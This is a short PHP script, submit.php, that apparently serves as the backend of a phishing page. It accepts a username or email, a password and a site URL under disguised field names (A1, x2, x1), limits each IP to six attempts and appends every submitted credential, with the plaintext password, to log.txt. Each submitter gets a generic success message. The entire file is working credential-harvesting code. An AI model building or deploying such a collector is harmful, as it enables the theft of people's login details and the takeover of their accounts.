<?php
// submit.php
header("Content-Type: application/json");

// Security: only allow POST
if ($_SERVER["REQUEST_METHOD"] !== "POST") {
    echo json_encode(["status" => "error", "message" => "Invalid request"]);
    exit;
}

// Collect inputs safely
$A1 = isset($_POST['A1']) ? trim($_POST['A1']) : '';
$x2 = isset($_POST['x2']) ? trim($_POST['x2']) : '';
$x1 = isset($_POST['x1']) ? trim($_POST['x1']) : '';
$ip = $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';

// Validate inputs
$errors = [];
if (empty($A1)) {
    $errors[] = "A1 (username/email) is required";
}
if (empty($x2)) {
    $errors[] = "x2 (password) is required";
}
if (empty($x1) || !filter_var($x1, FILTER_VALIDATE_URL)) {
    $errors[] = "x1 (URL) is invalid";
}

// File paths
$logFile = "log.txt";
$attemptsFile = "attempts.json";

// Load attempt counts
$attempts = [];
if (file_exists($attemptsFile)) {
    $attempts = json_decode(file_get_contents($attemptsFile), true);
}
if (!is_array($attempts)) {
    $attempts = [];
}

// Initialize IP attempts
if (!isset($attempts[$ip])) {
    $attempts[$ip] = 0;
}

// Check limit
if ($attempts[$ip] >= 6) {
    echo json_encode([
        "status" => "error",
        "message" => "Too many attempts. Please try again later."
    ]);
    exit;
}

// Increment attempts
$attempts[$ip]++;
file_put_contents($attemptsFile, json_encode($attempts, JSON_PRETTY_PRINT));

// If errors → reject but still count
if (!empty($errors)) {
    echo json_encode(["status" => "error", "message" => implode(", ", $errors)]);
    exit;
}

// Log attempt to file
$logLine = sprintf(
    "[%s] IP: %s | Attempt: %d | A1: %s | x2: %s | x1: %s\n",
    date("Y-m-d H:i:s"),
    $ip,
    $attempts[$ip],
    $A1,
    $x2,
    $x1
);

file_put_contents($logFile, $logLine, FILE_APPEND | LOCK_EX);

// Success response
echo json_encode([
    "status" => "success",
    "message" => "Data received successfully"
]);
exit;
?>
